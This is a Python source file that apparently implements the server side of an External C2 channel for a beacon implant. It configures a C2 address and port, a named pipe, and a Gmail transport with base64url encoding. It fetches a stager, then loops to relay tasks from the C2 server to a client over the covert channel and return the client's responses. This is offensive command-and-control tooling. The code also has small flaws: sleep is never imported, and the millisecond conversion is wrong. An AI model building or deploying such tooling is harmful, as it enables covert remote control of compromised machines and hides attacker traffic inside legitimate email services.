import sys
import argparse
from utils import commonUtils
import configureStage
import establishedSession


# TODO: Have a proper function that reads in a config

# DEBUG: <START GHETTO CONFIG>
############################################
############################################
# Address of External c2 server
global EXTERNAL_C2_ADDR
EXTERNAL_C2_ADDR = "127.0.0.1"

# Port of external c2 server
global EXTERNAL_C2_PORT
EXTERNAL_C2_PORT = "2222"

# The name of the pipe that the beacon should use
global C2_PIPE_NAME
C2_PIPE_NAME = "foobar"

# A time in milliseconds that indicates how long the External C2 server should block when no new tasks are available
global C2_BLOCK_TIME
C2_BLOCK_TIME = 100

# Desired Architecture of the Beacon
global C2_ARCH
C2_ARCH = "x86"

# How long to wait (in seconds) before polling the server for new tasks/responses
global IDLE_TIME
IDLE_TIME = 5

global ENCODER_MODULE
ENCODER_MODULE = "encoder_b64url"
global TRANSPORT_MODULE
TRANSPORT_MODULE = "transport_gmail"

###########################################
# DEBUG: </END GHETTO CONFIG>

def main():
	# Argparse for certain options
	parser = argparse.ArgumentParser()
	parser.add_argument('-v', action='store_true', help='Enable verbose output', dest='verbose', default=False)
	parser.add_argument('-d', action='store_true', help='Enable debugging output', dest='debug', default=False)


	# Call arguments with args.$ARGNAME
	global args
	args = parser.parse_args()

	# Enable verbose output if debug is enabled
	if args.debug:
		args.verbose = True

	# Import our defined encoder and transport modules
	if args.verbose:
		print (commonUtils.color("Importing encoder module: ") + "%s") % (ENCODER_MODULE)
	commonUtils.importModule(ENCODER_MODULE, "encoder")
	if args.verbose:
		print (commonUtils.color("Importing transport module: ") + "%s") % (TRANSPORT_MODULE)
	commonUtils.importModule(TRANSPORT_MODULE, "transport")


	try:
		# Start with logic to setup the connection to the external_c2 server
		sock = commonUtils.createSocket()

		# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
		# Poll covert channel for 'READY2INJECT' message from client
		#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
		# if args.verbose:
		#       print commonUtils.color("Client ready to recieve stager")

		# #####################

		# Prep the transport module
		prep_trans = transport.prepTransport()

		# Let's get the stager from the c2 server
		stager_status = configureStage.main(sock)

		if stager_status != 0:
			# Something went horribly wrong
			print commonUtils.color("Something went terribly wrong while configuring the stager!", status=False, warning=True)
			sys.exit(1)

		# TODO: Add logic that will check and recieve confirmation from the client that it is ready to recieve and process commands
		# Poll covert channel for 'READY4CMDS' message from client

		# Now that the stager is configured, lets start our main loop
		while True:
			if args.verbose:
				print commonUtils.color("Checking the c2 server for new tasks...")

			newTask = establishedSession.checkForTasks(sock)

			# once we have a new task (even an empty one), lets relay that to our client
			if args.debug:
				print commonUtils.color("Encoding and relaying task to client", status=False, yellow=True)
			establishedSession.relayTask(newTask)
			# Attempt to retrieve a response from the client
			if args.verbose:
				print commonUtils.color("Checking the client for a response...")
			b_response = establishedSession.checkForResponse()

			# Let's relay this response to the c2 server
			establishedSession.relayResponse(sock, b_response)
			sleep(C2_BLOCK_TIME/100) # python sleep is in seconds, C2_BLOCK_TIME in milliseconds


			# Restart this loop
	except KeyboardInterrupt:
		if args.debug:
			print commonUtils.color("\nClosing the socket to the c2 server")
		commonUtils.killSocket(sock)
		print commonUtils.color("\nExiting...", warning=True)
		sys.exit(0)

main()
